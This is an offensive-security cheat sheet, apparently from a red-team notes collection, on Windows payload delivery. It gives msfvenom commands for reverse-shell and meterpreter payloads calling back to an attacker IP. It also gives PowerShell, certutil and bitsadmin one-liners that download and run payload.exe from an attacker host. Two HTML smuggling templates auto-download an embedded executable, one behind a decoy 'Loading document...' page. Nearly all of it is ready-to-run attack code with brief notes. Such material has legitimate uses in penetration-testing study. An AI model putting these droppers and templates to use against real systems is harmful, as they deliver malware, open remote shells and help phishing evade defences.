---
tags:
  - Defense_Evasion
  - Execution
  - Foundational
  - Initial_Access
  - Windows
---

## Payload Staging Concepts
resources: [HackTricks - Phishing Files](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/phishing-documents.html)

> [!info] Droppers deliver payloads to target systems. Choice between staged and non-staged affects detection and reliability.

### Staged vs Non-Staged Payloads

#### Non-Staged Payload
> [!info] Complete payload in single file. Larger size, simpler execution. Single network transaction.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f exe -o shell.exe
```

#### Staged Payload
> [!info] Small initial stager downloads full payload. Smaller initial size, requires callback. Two-stage execution.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f exe -o stager.exe
```

### Building Droppers

#### PowerShell Download Cradle
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')
```

#### PowerShell Download and Execute
```powershell
$url = "http://<AttackerIP>/payload.exe"
$out = "$env:TEMP\payload.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out
```

#### Certutil Dropper [alternative]
```cmd
certutil -urlcache -split -f http://<AttackerIP>/payload.exe %TEMP%\payload.exe && %TEMP%\payload.exe
```

#### Bitsadmin Dropper [alternative]
```cmd
bitsadmin /transfer job /download /priority high http://<AttackerIP>/payload.exe %TEMP%\payload.exe && %TEMP%\payload.exe
```

## HTML Smuggling

> [!tip] Embed payload in HTML/JavaScript to bypass network filters. Payload constructed client-side, never crosses network as executable.

### Base64 HTML Smuggling Template
> [!info] Save as .html file. When opened, automatically downloads embedded payload.

```html
<html>
<head>
<script>
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var file = '<Base64Payload>';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'payload.exe';

if(window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
</script>
</head>
<body>
<p>This page requires JavaScript to be enabled.</p>
</body>
</html>
```

### Generate Base64 Payload [Local]
```bash
base64 -w 0 payload.exe
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe"))
```

### HTML Smuggling with Fetch API [alternative]
> [!tip] More modern approach using **Fetch API**.

```html
<html>
<script>
async function smuggle() {
    const response = await fetch('data:application/octet-stream;base64,<Base64Payload>');
    const blob = await response.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'document.exe';
    a.click();
}
smuggle();
</script>
<body>Loading document...</body>
</html>
```
